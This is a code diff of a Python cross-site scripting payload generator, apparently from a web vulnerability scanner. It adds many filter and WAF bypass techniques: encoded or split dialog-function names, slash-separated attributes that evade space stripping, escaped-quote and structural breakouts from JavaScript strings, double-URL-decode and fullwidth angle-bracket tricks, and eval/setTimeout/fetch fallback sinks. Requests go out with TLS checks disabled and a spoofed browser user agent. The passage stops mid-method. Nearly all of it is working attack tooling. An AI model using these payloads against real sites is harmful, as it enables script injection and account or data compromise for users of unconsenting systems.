@@ -30,9 +30,30 @@ import secrets
 import string
 import subprocess
 import sys
+from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 from html.parser import HTMLParser
 from urllib.parse import quote
+
+try:
+    import requests
+    import urllib3
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+except ImportError:
+    requests = None
+
+_UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
+       "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
+_VERIFY_SESSION = None
+
+
+def _get_verify_session():
+    global _VERIFY_SESSION
+    if _VERIFY_SESSION is None and requests is not None:
+        s = requests.Session()
+        s.headers.update({"User-Agent": _UA})
+        _VERIFY_SESSION = s
+    return _VERIFY_SESSION
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from log_utils import latest_log_path, new_log_path
@@ -118,6 +139,21 @@ def char_scores(results, refl_idx):
     return scores
 
 
+def escaped_quotes(results, refl_idx):
+    """Quote chars that the server backslash-escaped ('"' -> '\\"',
+    "'" -> "\\'"). In a JS string context, injecting '\\"' when '\\' is not
+    stripped/blocked produces '\\\\"' -> literal backslash + live closing
+    quote."""
+    esc = set()
+    for r in results:
+        if r["reflection_index"] != refl_idx:
+            continue
+        exp, got = r["expected"], r["got_back"] or ""
+        if exp in ("'", '"', "`") and got == "\\" + exp:
+            esc.add(exp)
+    return esc
+
+
 def usable(ch, scores):
     return scores.get(ch, 0) >= 100
 
@@ -131,9 +167,11 @@ def min_eff(payload, scores):
     return min(scores[c] for c in used)
 
 
-def required_ok(payload, scores):
-    """Gate: only emit payload if every probe char it needs scored 100."""
-    probe = set("'\"<>/\\")
+def required_ok(payload, scores, allow_chars=None):
+    """Gate: only emit payload if every probe char it needs scored 100
+    (or is explicitly permitted via allow_chars, e.g. escaped-quote
+    breakout in JS string context)."""
+    probe = set("'\"<>/\\") - set(allow_chars or ())
     return all(scores[c] == 100 for c in payload if c in probe)
 
 
@@ -234,6 +272,16 @@ def entity_variants(name, kw):
     return name[:i] + secrets.choice(forms) + name[i + 1:]
 
 
+def _throw_ops(kw):
+    """Operands for the onerror/throw idiom. 'throw 1' is canonical, but a
+    dead ' ' probe means the space is stripped or splits the handler
+    attribute — then only space-free operands work: 'throw-1' == 'throw -1',
+    also 'throw/1/' (regex literal) and 'throw'x'' (string literal)."""
+    if kw.get("space") is False:
+        return ("throw-1", "throw/1/")
+    return ("throw 1", "throw-1")
+
+
 def encoded_funcs(kw):
     """Dialog-fn call strings with one letter entity-encoded, emitted
     ONLY for call forms whose plain version is blocked by the keyword
@@ -248,30 +296,25 @@ def encoded_funcs(kw):
     parens = kw.get("parentheses", True) and kw.get("gen_call", True)
     btick = kw.get("backtick", True) and kw.get("gen_tick", True)
     out = []
-    for name in ("alert", "confirm", "prompt"):
+    for name in ("alert", "confirm", "prompt", "print"):
+        arg = "()" if name == "print" else "(1)"
         enc = entity_fname(name)
         var = entity_variants(name, kw)
         if parens and (not kw.get(name, True)
                        or not kw.get(f"call_{name}", True)):
-            out.append(f"{enc}(1)")
+            out.append(f"{enc}{arg}")
             if var:
-                out.append(f"{var}(1)")
+                out.append(f"{var}{arg}")
         if btick and (not kw.get(name, True)
                       or not kw.get(f"tick_{name}", True)):
             out.append(f"{enc}`1`")
             if var:
                 out.append(f"{var}`1`")
-    if parens and (not kw.get("print", True)
-                   or not kw.get("call_print", True)):
-        out.append(entity_fname("print") + "()")
-        pv = entity_variants("print", kw)
-        if pv:
-            out.append(pv + "()")
-    if not parens and not btick and not kw.get("alert", True):
-        out.append(f"onerror={entity_fname('alert')};throw 1")
-        av = entity_variants("alert", kw)
-        if av:
-            out.append(f"onerror={av};throw 1")
+        if not parens and not btick and not kw.get(name, True):
+            for op in _throw_ops(kw):
+                out.append(f"onerror={enc};{op}")
+                if var:
+                    out.append(f"onerror={var};{op}")
     return out
 
 
@@ -294,19 +337,18 @@ def u_funcs(kw):
     parens = kw.get("parentheses", True) and kw.get("gen_call", True)
     btick = kw.get("backtick", True) and kw.get("gen_tick", True)
     out = []
-    for name in ("alert", "confirm", "prompt"):
+    for name in ("alert", "confirm", "prompt", "print"):
+        arg = "()" if name == "print" else "(1)"
         enc = u_fname(name)
         if parens and (not kw.get(name, True)
                        or not kw.get(f"call_{name}", True)):
-            out.append(f"{enc}(1)")
+            out.append(f"{enc}{arg}")
         if btick and (not kw.get(name, True)
                       or not kw.get(f"tick_{name}", True)):
             out.append(f"{enc}`1`")
-    if parens and (not kw.get("print", True)
-                   or not kw.get("call_print", True)):
-        out.append(u_fname("print") + "()")
-    if not parens and not btick and not kw.get("alert", True):
-        out.append(f"onerror={u_fname('alert')};throw 1")
+        if not parens and not btick and not kw.get(name, True):
+            for op in _throw_ops(kw):
+                out.append(f"onerror={enc};{op}")
     return out
 
 
@@ -330,20 +372,21 @@ def u6_funcs(kw):
     parens = kw.get("parentheses", True) and kw.get("gen_call", True)
     btick = kw.get("backtick", True) and kw.get("gen_tick", True)
     brace = kw.get("gen_u6brace", True)
+    if not brace:
+        return []
     out = []
-    for name in ("alert", "confirm", "prompt"):
+    for name in ("alert", "confirm", "prompt", "print"):
+        arg = "()" if name == "print" else "(1)"
         enc = u6_fname(name)
-        if parens and brace and (not kw.get(name, True)
-                                 or not kw.get(f"call_{name}", True)):
-            out.append(f"{enc}(1)")
-        if btick and brace and (not kw.get(name, True)
-                                or not kw.get(f"tick_{name}", True)):
+        if parens and (not kw.get(name, True)
+                       or not kw.get(f"call_{name}", True)):
+            out.append(f"{enc}{arg}")
+        if btick and (not kw.get(name, True)
+                      or not kw.get(f"tick_{name}", True)):
             out.append(f"{enc}`1`")
-    if parens and brace and (not kw.get("print", True)
-                             or not kw.get("call_print", True)):
-        out.append(u6_fname("print") + "()")
-    if not parens and not btick and not kw.get("alert", True):
-        out.append(f"onerror={u6_fname('alert')};throw 1")
+        if not parens and not btick and not kw.get(name, True):
+            for op in _throw_ops(kw):
+                out.append(f"onerror={enc};{op}")
     return out
 
 
@@ -382,48 +425,40 @@ def bracket_funcs(kw, forbid_q=None):
         # coverage of anything a random splitter could emit
         splits = [(name[:k], name[k:]) for k in range(1, len(name))]
         cp = ord(name[0])
-        v = []
-        if parens:
-            for q in quotes:
-                if name_ok:
-                    v.append(f"self[{q}{name}{q}]{arg}")
-                    # single-string escapes: the JS engine decodes these
-                    # INSIDE the string literal — the request carries
-                    # neither the fn name nor a concat shape. '\a' is a
-                    # noop-escape: backslash before a non-escape letter
-                    # is ignored -> 'a' (NZT-48 invalid-escape vector).
-                    v.append(f"self[{q}\\{name[0]}{name[1:]}{q}]{arg}")
-                v.append(f"self[{q}\\x{cp:02x}{name[1:]}{q}]{arg}")
-                v.append(f"self[{q}\\{cp:03o}{name[1:]}{q}]{arg}")
-                v.append(f"self[{q}\\u{{{cp:x}}}{name[1:]}{q}]{arg}")
-                for fst, rst in splits:
-                    v.append(f"self[{q}{fst}{q}+{q}{rst}{q}]{arg}")
-            if obj != "self":
-                q = quotes[0]
-                if name_ok:
-                    v.append(f"{obj}[{q}{name}{q}]{arg}")
-                v.append(f"{obj}[{q}\\x{cp:02x}{name[1:]}{q}]{arg}")
-                for fst, rst in splits[:2]:
-                    v.append(f"{obj}[{q}{fst}{q}+{q}{rst}{q}]{arg}")
-            q, (fst, rst) = quotes[0], splits[0]
-            v.append(f"{obj}[{q}\\x{cp:02x}{q}+{q}{rst}{q}]{arg}")
-            v.append(f"{obj}[{q}\\{cp:03o}{q}+{q}{rst}{q}]{arg}")
-            v.append(f"{obj}[{q}\\u{{{cp:x}}}{q}+{q}{rst}{q}]{arg}")
-        elif btick:
-            for q in quotes:
-                if name_ok:
-                    v.append(f"self[{q}{name}{q}]`1`")
-                v.append(f"self[{q}\\x{cp:02x}{name[1:]}{q}]`1`")
-                for fst, rst in splits:
-                    v.append(f"self[{q}{fst}{q}+{q}{rst}{q}]`1`")
-        else:
-            q, (fst, rst) = quotes[0], splits[0]
+        exprs = []
+        for q in quotes:
             if name_ok:
-                v.append(f"onerror=self[{q}{name}{q}];throw 1")
-            v.append(f"onerror=self[{q}\\x{cp:02x}{name[1:]}{q}]"
-                     f";throw 1")
-            v.append(f"onerror={obj}[{q}{fst}{q}+{q}{rst}{q}]"
-                     f";throw 1")
+                exprs.append(f"self[{q}{name}{q}]")
+                # single-string escapes: the JS engine decodes these
+                # INSIDE the string literal — the request carries
+                # neither the fn name nor a concat shape. '\a' is a
+                # noop-escape: backslash before a non-escape letter
+                # is ignored -> 'a' (NZT-48 invalid-escape vector).
+                exprs.append(f"self[{q}\\{name[0]}{name[1:]}{q}]")
+            exprs.append(f"self[{q}\\x{cp:02x}{name[1:]}{q}]")
+            exprs.append(f"self[{q}\\{cp:03o}{name[1:]}{q}]")
+            exprs.append(f"self[{q}\\u{{{cp:x}}}{name[1:]}{q}]")
+            for fst, rst in splits:
+                exprs.append(f"self[{q}{fst}{q}+{q}{rst}{q}]")
+        if obj != "self":
+            q = quotes[0]
+            if name_ok:
+                exprs.append(f"{obj}[{q}{name}{q}]")
+            exprs.append(f"{obj}[{q}\\x{cp:02x}{name[1:]}{q}]")
+            for fst, rst in splits:
+                exprs.append(f"{obj}[{q}{fst}{q}+{q}{rst}{q}]")
+        q, (fst, rst) = quotes[0], splits[0]
+        exprs.append(f"{obj}[{q}\\x{cp:02x}{q}+{q}{rst}{q}]")
+        exprs.append(f"{obj}[{q}\\{cp:03o}{q}+{q}{rst}{q}]")
+        exprs.append(f"{obj}[{q}\\u{{{cp:x}}}{q}+{q}{rst}{q}]")
+
+        if parens:
+            v = [f"{e}{arg}" for e in exprs]
+        elif btick:
+            v = [f"{e}`1`" for e in exprs]
+        else:
+            v = [f"onerror={e};{op}" for e in exprs
+                 for op in _throw_ops(kw)]
         per_name.append(v)
     # Round-robin across fn names: a growing fn_cap samples every family
     # evenly (each name's simplest forms first) instead of exhausting one
@@ -466,18 +501,17 @@ def avail_funcs(kw):
     call_shape = parens and kw.get("gen_call", True)
     tick_shape = btick and kw.get("gen_tick", True)
     funcs = []
-    for name in ("alert", "confirm", "prompt"):
+    for name in ("alert", "confirm", "prompt", "print"):
         if not kw.get(name, True):
             continue
+        arg = "()" if name == "print" else "(1)"
         if parens and kw.get(f"call_{name}", kw.get("gen_call", True)):
-            funcs.append(f"{name}(1)")
+            funcs.append(f"{name}{arg}")
         if btick and kw.get(f"tick_{name}", kw.get("gen_tick", True)):
             funcs.append(f"{name}`1`")
-    if parens and kw.get("print", True) and \
-            kw.get("call_print", kw.get("gen_call", True)):
-        funcs.append("print()")
-    if not call_shape and not tick_shape and kw.get("alert", True):
-        funcs.append("onerror=alert;throw 1")
+        if not call_shape and not tick_shape:
+            for op in _throw_ops(kw):
+                funcs.append(f"onerror={name};{op}")
     return funcs
 
 
@@ -488,15 +522,20 @@ INERT_SCRIPT_SINKS = ("innerhtml", "outerhtml", "insertadjacenthtml",
                       "createcontextualfragment")
 
 
-def compose(ctx, quote, scores, kw=None, kwv=None, inert=False, fn_cap=2):
+def compose(ctx, quote, scores, kw=None, kwv=None, inert=False, fn_cap=2,
+            escaped_q=None, js_breakout="", deny=False):
     """Assemble candidate payloads from grammar primitives.
     kw: keyword mask {name: bool} from the probe2 analysis (Layer B/C gate).
     kwv: {name: (expected, got_back)} — the actual probed strings, needed to
     build nested splitters from whatever string the filter deleted.
     inert: sink inserts markup without running scripts (innerHTML-family).
+    escaped_q: set of quote chars backslash-escaped by the filter ('\"').
+    js_breakout: structural closer sequence (e.g. '"]})') computed from the
+    enclosing <script> prefix up to the reflection point.
     Returns list of dicts: {payload, technique, case_ref, efficiency}."""
     kw = kw or {}
     kwv = kwv or {}
+    escaped_q = escaped_q or set()
     funcs = avail_funcs(kw)
     # Contexts where a fn lands INSIDE a live quote — a bracket-concat
     # using the same quote char would terminate it early ('-...-' in a
@@ -508,23 +547,94 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False, fn_cap=2):
                          and quote in ("'", '"')) else None
     # hfuncs — event-handler attribute values (on*="..."): both HTML
     # char refs (&#NNN;) and JS unicode escapes (NNNN) decode there.
+    # Inside inline HTML event handlers (onfocus=, onload=, onerror=, ...),
+    # the browser wraps the handler body in `with(document){with(this){...}}`.
+    # Because every HTMLElement/SVGElement defines `this.onerror`, a bare
+    # `onerror=alert;throw 1` assigns to the element's own onerror property
+    # instead of `window.onerror`, so `throw 1` never invokes the dialog!
+    # Qualifying as `self.onerror=...;throw 1` escapes `with(this)` shadowing.
     # jfuncs — JS-source positions (<script> bodies, js_* contexts,
     # javascript: URIs): only \u escapes decode; &#NNN; stays literal.
     # Both lists are pre-filtered through required_ok: an fn needing a
     # probe char that scored <100 can never survive add()'s gate anyway,
     # and leaving it in place would waste hfuncs[:fn_cap]/[0] slots on dead
     # variants (e.g. aler\u0074(1) when '\' is escaped -> '\\').
-    hfuncs = [f for f in (funcs + encoded_funcs(kw) + u_funcs(kw)
-                          + u6_funcs(kw) + bracket_funcs(kw, forbid_q))
-              if required_ok(f, scores)]
-    jfuncs = [f for f in (funcs + u_funcs(kw) + u6_funcs(kw)
-                          + bracket_funcs(kw, forbid_q))
-              if required_ok(f, scores)]
+    # Strings the filter deleted outright (item FAILed AND its reflection
+    # came back empty). Used both to split blocked tags in HTML context and,
+    # when every standard/encoded/unicode/bracket fn primitive is dead, to
+    # reconstruct dialog fn names in ANY context (e.g. 'alconfirmert' ->
+    # filter strips 'confirm' -> 'alert').
+    splitters = sorted(
+        ((n, e) for n, (e, g) in kwv.items()
+         if not kw.get(n, True) and e and g == ""),
+        key=lambda p: (p[0] != "rand_tag", "<" not in p[1], p[0]))
+    rsplit = [s for _, s in splitters]
+
+    def _rebuild_name(name, s):
+        """Call forms for one dialog name split by splitter s. s == name is
+        kept: str_replace removes the embedded occurrence in a single pass
+        and the merged residue ('al'+'alert'+'ert' -> 'alert') survives."""
+        parens = kw.get("parentheses", True) and kw.get("gen_call", True)
+        btick = kw.get("backtick", True) and kw.get("gen_tick", True)
+        arg = "()" if name == "print" else "(1)"
+        sp = split_str(name, s)
+        if parens:
+            return [f"{sp}{arg}"]
+        if btick:
+            return [f"{sp}`1`"]
+        return [f"onerror={sp};{op}" for op in _throw_ops(kw)]
+
+    def rebuild_fn(s):
+        """funcs is empty -> every call primitive is blocked.
+        Rebuild dialog fns via splitter s + the call syntax that
+        survived; the mid-name split also breaks call_*/tick_*
+        junction signatures (request never contains 'alert(1)')."""
+        return [f for name in ("alert", "confirm", "prompt", "print")
+                for f in _rebuild_name(name, s)]
+
+    def sink_fns():
+        """Last-resort sinks for kill-lists that ban every dialog name AND
+        every call syntax: functions reachable through unblocked names —
+        eval/setTimeout/Function (string-eval sinks), fetch (request
+        primitive), open (popup). 'open' is ordered last: inside an inline
+        handler 'with(document)' scope binds it to document.open, which
+        dies on 'this' when invoked by window.onerror — no observable
+        effect; eval/setTimeout/Function have no document.* shadow and
+        provably receive the thrown error string."""
+        return [f"onerror={n};{op}"
+                for n in ("eval", "setTimeout", "Function", "fetch", "open")
+                for op in _throw_ops(kw)]
+
+    def rebuild_all():
+        """Name-major rebuild order: 'alert' tried against every splitter
+        before 'confirm' — the first name usually sits earliest in the
+        blacklist, so its merged residue most often survives."""
+        return [f for name in ("alert", "confirm", "prompt", "print")
+                for s in rsplit if required_ok(s, scores)
+                for f in _rebuild_name(name, s) if required_ok(f, scores)]
+
+    raw_hfuncs = [f for f in (funcs + encoded_funcs(kw) + u_funcs(kw)
+                              + u6_funcs(kw) + bracket_funcs(kw, forbid_q))
+                  if required_ok(f, scores)]
+    raw_jfuncs = [f for f in (funcs + u_funcs(kw) + u6_funcs(kw)
+                              + bracket_funcs(kw, forbid_q))
+                  if required_ok(f, scores)]
+    if not raw_hfuncs:
+        # deny pages (rid==0) kill any request CONTAINING a blocked string,
+        # so splitter-embedded names are corpses — go straight to sinks.
+        raw_hfuncs = ([] if deny else rebuild_all()) + \
+            [f for f in sink_fns() if required_ok(f, scores)]
+    if not raw_jfuncs:
+        raw_jfuncs = ([] if deny else rebuild_all()) + \
+            [f for f in sink_fns() if required_ok(f, scores)]
+    hfuncs = [(f"self.{f}" if f.startswith("onerror=") else f)
+              for f in raw_hfuncs]
+    jfuncs = list(raw_jfuncs)
     out = []
     marker = "vvm{id}"
 
-    def add(payload, technique, case_ref):
-        if required_ok(payload, scores):
+    def add(payload, technique, case_ref, allow_chars=None):
+        if required_ok(payload, scores, allow_chars=allow_chars):
             if "&#" in payload:
                 technique += " (entity-encoded fn)"
             if "\\u" in payload:
@@ -544,8 +654,19 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False, fn_cap=2):
         different signature — their gate already ran in the fn builders."""
         return "(" not in fn or gen_key is None or kw.get(gen_key, True)
 
+    def attr_val(fn):
+        """Quote a handler value when it contains spaces ('onerror=...;throw 1')
+        so HTML tokenization does not split the attribute at 'throw 1'."""
+        if " " not in fn:
+            return fn
+        for q in ('"', "'"):
+            if q not in fn and usable(q, scores):
+                return f"{q}{fn}{q}"
+        return fn
+
     tags_ok = usable("<", scores) and usable(">", scores)
     slash_ok = usable("/", scores)
+    space_ok = (kw.get("space") is not False) or bool(kw.get("pair_img_onerror"))
     q_ok = quote == "" or usable(quote, scores)
     script_ok = kw.get("script_tag", True)
 
@@ -556,33 +677,10 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False, fn_cap=2):
 
     if ctx == "html":
         if tags_ok:
-            # Strings the filter deleted outright (item FAILed AND its
-            # reflection came back empty). Any one of them can be nested
-            # inside a blocked tag/keyword: the filter deletes the splitter
-            # and the fragments merge back (case: xss tag removed.md).
-            # rand_tag first — when even the random junk tag was stripped the
-            # filter is a generic tag-stripper that can split ANYTHING.
-            splitters = sorted(
-                ((n, e) for n, (e, g) in kwv.items()
-                 if not kw.get(n, True) and e and g == ""),
-                key=lambda p: (p[0] != "rand_tag", "<" not in p[1], p[0]))
-            rsplit = [s for _, s in splitters]
-
             def fix(key, word, s):
                 """Split word with removed string s when its kw key was
                 blocked; leave it unchanged when it passed."""
                 return word if kw.get(key, True) else split_str(word, s)
-
-            def rebuild_fn(s):
-                """funcs is empty -> every call primitive is blocked.
-                Rebuild 'alert' via splitter s + the call syntax that
-                survived; the mid-name split also breaks call_*/tick_*
-                junction signatures (request never contains 'alert(1)')."""
-                if kw.get("parentheses", True) and kw.get("gen_call", True):
-                    return [split_str("alert", s) + "(1)"]
-                if kw.get("backtick", True) and kw.get("gen_tick", True):
-                    return [split_str("alert", s) + "`1`"]
-                return []
 
             if not inert:
                 if script_ok:
@@ -604,12 +702,24 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False, fn_cap=2):
                                 f"{split_str('</script>', s)}",
                                 f"nested tag-strip bypass ({s} splitter)", "tag_removed")
             for tag, ev, extra, deps in TAG_HANDLERS:
-                if all(kw.get(d, True) for d in deps):
+                if all(kw.get(d, True) for d in deps) and space_ok:
                     for fn in hfuncs[:fn_cap]:
                         if shape_ok(GEN_EV.get(ev), fn):
-                            add(f"<{tag} {extra} {marker} {ev}={fn}>"
+                            add(f"<{tag} {extra} {marker} {ev}={attr_val(fn)}>"
                                 .replace("  ", " "),
                                 f"{tag} {ev} handler", "body_direct")
+                elif not space_ok and slash_ok and \
+                        kw.get(f"{tag}_tag", True) and kw.get(ev, True):
+                    # Space stripped/blocked: use '/' as HTML5 attribute
+                    # separator inside the tag (<svg/vvm.../onload=fn>).
+                    # Note: 'src=x' must become boolean 'src' because in HTML5
+                    # an unquoted attribute value ('src=x/...') swallows '/'.
+                    s_extra = "src" if extra == "src=x" else extra
+                    for fn in [f for f in hfuncs if " " not in f][:fn_cap]:
+                        parts = [f"<{tag}", s_extra, marker, f"{ev}={fn}>"]
+                        add("/".join(p for p in parts if p),
+                            f"slash-separated {tag} {ev} handler (space bypass)",
+                            "body_direct")
                 else:
                     # Rebuild blocked atoms by nesting a removed string.
                     # When ONLY the pair_* junction failed (e.g. the WAF
@@ -624,11 +734,12 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False, fn_cap=2):
                             for d in deps if not d.startswith("pair_"))
                         tag_atom = fix(tag + "_tag", "<" + tag, s) \
                             if atom_blocked else split_str("<" + tag, s)
-                        for fn0 in hfuncs[:fn_cap] or rebuild_fn(s):
-                            if "=" in fn0:
-                                # in-attribute fallback already carries
-                                # 'onerror=' — emit it bare, tag split only
-                                add(f"{tag_atom} {extra} {marker} {fn0}>"
+                        for fn0 in hfuncs[:fn_cap] or [
+                                (f"self.{r}" if r.startswith("onerror=") else r)
+                                for r in rebuild_fn(s)]:
+                            if ";" in fn0 or "=" in fn0:
+                                add(f"{tag_atom} {extra} {marker} "
+                                    f"{fix(ev, ev, s)}={attr_val(fn0)}>"
                                     .replace("  ", " "),
                                     f"removed-string splitter ({s})", "tag_removed")
                                 continue
@@ -657,7 +768,7 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False, fn_cap=2):
             if kw.get("svg_tag", True) and not kw.get("onload", True) \
                     and kw.get("case_onload", True):
                 for fn in hfuncs[:fn_cap]:
-                    add(f"<svg {marker} OnLoAd={fn}>",
+                    add(f"<svg {marker} OnLoAd={attr_val(fn)}>",
                         "case-mutated onload handler", "body_direct")
             # last-resort: entity-encoded inner HTML inside iframe srcdoc.
             # Reaches the case "keywords/()/script blocked but entities pass".
@@ -682,24 +793,67 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False, fn_cap=2):
                     return True
                 e, g = kwv.get(key, ("", ""))
                 return bool(e) and g == e.replace(">", "")
-            for tag, ev, extra, deps in TAG_HANDLERS:
+            slash_handlers = sorted(
+                TAG_HANDLERS, key=lambda th: (th[0] != "svg", th[2] != ""))
+            for tag, ev, extra, deps in (
+                    TAG_HANDLERS if space_ok else slash_handlers):
                 others = [d for d in deps if d != deps[0]]
                 if name_ok(deps[0]) and \
-                        all(kw.get(d, True) for d in others):
+                        all(kw.get(d, True) for d in others) and space_ok:
                     for fn in hfuncs[:fn_cap]:
                         add(f"<{tag} {extra} {marker} {ev}={fn}//"
                             .replace("  ", " "),
                             f"no greater-than ({tag} {ev})", "gt_missing")
+                elif not space_ok and slash_ok and name_ok(deps[0]) and \
+                        kw.get(ev, True):
+                    s_extra = "src" if extra == "src=x" else extra
+                    for fn in [f for f in hfuncs if " " not in f][:fn_cap]:
+                        parts = [f"<{tag}", s_extra, marker, f"{ev}={fn}//"]
+                        add("/".join(p for p in parts if p),
+                            f"slash-separated no greater-than ({tag} {ev})",
+                            "gt_missing")
+        else:
+            # Raw '<' was blocked/encoded/removed, but check if double URL-decode
+            # ('%3c' -> '<') or Unicode NFKC normalization ('\uff1c' -> '<')
+            # reconstructed a literal '<' behind the filter.
+            durl_lt = kwv.get("double_url_lt", ("", ""))[1] == "<"
+            fw_lt = kwv.get("fullwidth_lt", ("", ""))[1] == "<"
+            for active, lt_rep, gt_rep, label in (
+                (durl_lt, "%3c", "%3e", "double URL-decoded angle bypass"),
+                (fw_lt, "\uff1c", "\uff1e", "Unicode fullwidth NFKC angle bypass"),
+            ):
+                if not active:
+                    continue
+                for fn in hfuncs[:fn_cap]:
+                    add(f"{lt_rep}svg {marker} onload={attr_val(fn)}{gt_rep}",
+                        label, "body_direct", allow_chars={"<", ">"})
+                    add(f"{lt_rep}img src=x {marker} onerror={attr_val(fn)}{gt_rep}",
+                        label, "body_direct", allow_chars={"<", ">"})
+                if not inert:
+                    for fn in jfuncs[:fn_cap]:
+                        add(f"{lt_rep}script {marker}{gt_rep}{fn}"
+                            f"{lt_rep}/script{gt_rep}",
+                            label, "body_direct", allow_chars={"<", ">"})
 
     elif ctx == "attr":
         if tags_ok and q_ok and quote:
             for tag, ev, extra in handler_variants():
                 for fn in hfuncs[:fn_cap]:
-                    if shape_ok(GEN_EV.get(ev), fn):
-                        add(f'{quote}><{tag} {extra} {marker} {ev}={fn}>'
+                    if shape_ok(GEN_EV.get(ev), fn) and space_ok:
+                        add(f'{quote}><{tag} {extra} {marker} {ev}={attr_val(fn)}>'
                             .replace("  ", " "),
                             "attribute breakout -> tag", "breakout_tag")
-            if script_ok and jfuncs:
+            if not space_ok and slash_ok:
+                for tag, ev, extra, _deps in TAG_HANDLERS:
+                    if kw.get(f"{tag}_tag", True) and kw.get(ev, True):
+                        s_extra = "src" if extra == "src=x" else extra
+                        for fn in [f for f in hfuncs if " " not in f][:fn_cap]:
+                            parts = [f"{quote}><{tag}", s_extra, marker,
+                                     f"{ev}={fn}>"]
+                            add("/".join(p for p in parts if p),
+                                "slash-separated attribute breakout -> tag",
+                                "breakout_tag")
+            if script_ok and jfuncs and space_ok:
                 for fn in jfuncs[:fn_cap]:
                     if shape_ok("gen_script", fn):
                         add(f'{quote}><script {marker}>{fn}</script>',
@@ -707,10 +861,17 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False, fn_cap=2):
         elif q_ok:
             sep = quote if quote else " "
             if hfuncs and kw.get("autofocus", True) and kw.get("onfocus", True):
-                for fn in hfuncs[:fn_cap]:
-                    add(f'{sep} autofocus onfocus={sep}{fn}' if quote else
-                        f' autofocus onfocus={fn} accesskey=x',
-                        "in-context attribute injection", "attr_inject")
+                if space_ok:
+                    for fn in hfuncs[:fn_cap]:
+                        if quote or " " not in fn:
+                            add(f'{sep} autofocus onfocus={sep}{fn}' if quote else
+                                f' autofocus onfocus={fn} accesskey=x',
+                                "in-context attribute injection", "attr_inject")
+                elif slash_ok and quote:
+                    for fn in [f for f in hfuncs if " " not in f][:fn_cap]:
+                        add(f'{quote}/autofocus/onfocus={quote}{fn}',
+                            "slash-separated attribute injection (space bypass)",
+                            "attr_inject")
 
     elif ctx == "attr_handler":
         # input already inside an existing on*="" handler — zero-breaker JS
@@ -745,6 +906,10 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False, fn_cap=2):
                     "srcdoc entity HTML", "special_attrs")
 
     elif ctx == "js_raw":
+        if js_breakout and usable("/", scores):
+            for fn in jfuncs[:fn_cap]:
+                add(f'{js_breakout};{fn}/*{marker}*/;//',
+                    f"structural JS closer ({js_breakout})", "js_string_exec")
         for fn in jfuncs:
             add(f'{fn}/*{marker}*/', "raw JS direct call", "js_string_exec")
         for fn in jfuncs[:fn_cap]:
@@ -796,8 +961,38 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False, fn_cap=2):
             else:
                 fns = []
             for fn in fns:
-                add(f"{quote}-{fn}-{quote}", "in-string JS execution",
-                    "js_string_exec")
+                if ";" not in fn:
+                    add(f"{quote}-{fn}-{quote}", "in-string JS execution",
+                        "js_string_exec")
+            # Structural closer breakout (e.g. '"]});alert(1);//') for nested
+            # objects/arrays/callbacks or statement-only fns (onerror=;throw 1)
+            if js_breakout and len(js_breakout) > len(quote) and slash_ok:
+                for fn in jfuncs[:fn_cap]:
+                    add(f"{js_breakout};{fn}/*{marker}*/;//",
+                        f"structural JS closer ({js_breakout})",
+                        "js_string_exec")
+            elif slash_ok:
+                for fn in jfuncs[:fn_cap]:
+                    add(f"{quote};{fn}/*{marker}*/;//",
+                        "statement JS string breakout",
+                        "js_string_exec")
+        elif quote and quote in escaped_q and scores.get("\\", 0) >= 50:
+            # Server backslash-escapes the quote ('"' -> '\\"') while '\'
+            # survives as '\' or '\\': injecting '\"' yields '\\"' ->
+            # literal backslash + unescaped closing quote.
+            allow_esc = {quote, "\\"}
+            for fn in jfuncs[:fn_cap]:
+                add(f"\\{quote}-{fn}-\\{quote}",
+                    "escaped-quote in-string JS execution",
+                    "js_string_exec", allow_chars=allow_esc)
+                if js_breakout and len(js_breakout) > len(quote) and slash_ok:
+                    add(f"\\{js_breakout};{fn}/*{marker}*/;//",
+                        f"escaped structural JS closer (\\{js_breakout})",
+                        "js_string_exec", allow_chars=allow_esc)
+                elif usable("/", scores):
+                    add(f"\\{quote};{fn}/*{marker}*/;//",
+                        "escaped-quote JS breakout",
+                        "js_string_exec", allow_chars=allow_esc)
 
     elif ctx.startswith("consuming:"):
         tag = ctx.split(":", 1)[1]
@@ -817,10 +1012,16 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False, fn_cap=2):
 
     elif ctx == "comment":
         if tags_ok and hfuncs and kw.get("svg_tag", True) \
-                and kw.get("onload", True) and kw.get("pair_svg_onload", True):
-            for fn in hfuncs[:fn_cap]:
-                if shape_ok("gen_handler", fn):
-                    add(f"--><svg {marker} onload={fn}>", "comment breakout",
+                and kw.get("onload", True):
+            if space_ok and kw.get("pair_svg_onload", True):
+                for fn in hfuncs[:fn_cap]:
+                    if shape_ok("gen_handler", fn):
+                        add(f"--><svg {marker} onload={fn}>", "comment breakout",
+                            "comment_break")
+            elif not space_ok and slash_ok:
+                for fn in [f for f in hfuncs if " " not in f][:fn_cap]:
+                    add(f"--><svg/{marker}/onload={fn}>",
+                        "slash-separated comment breakout (space bypass)",
                         "comment_break")
 
     return out
@@ -836,6 +1037,9 @@ class MarkerDomCheck(HTMLParser):
     fired (innerHTML/insertAdjacentHTML-inserted scripts never execute). A
     script that truly ran was already caught by the alert-hook 'fired' list."""
 
+    _INERT_CONTAINERS = ("textarea", "title", "xmp", "noembed", "noscript",
+                         "template", "style")
+
     def __init__(self, marker, script_inert=False):
         super().__init__(convert_charrefs=False)
         self.marker = marker
@@ -843,49 +1047,73 @@ class MarkerDomCheck(HTMLParser):
         self.executable = False
         self.evidence = ""
         self._in_script = False
+        self._script_nonexec = False
         self._script_buf = None
+        self._inert_tag = None
         self.script_hits = []   # script bodies containing the needle
         self.attr_hits = []     # (tag, attr, value) executable attrs seen
         self.url_hits = []      # (tag, attr, value) javascript:/data: URLs
 
     def handle_starttag(self, tag, attrs):
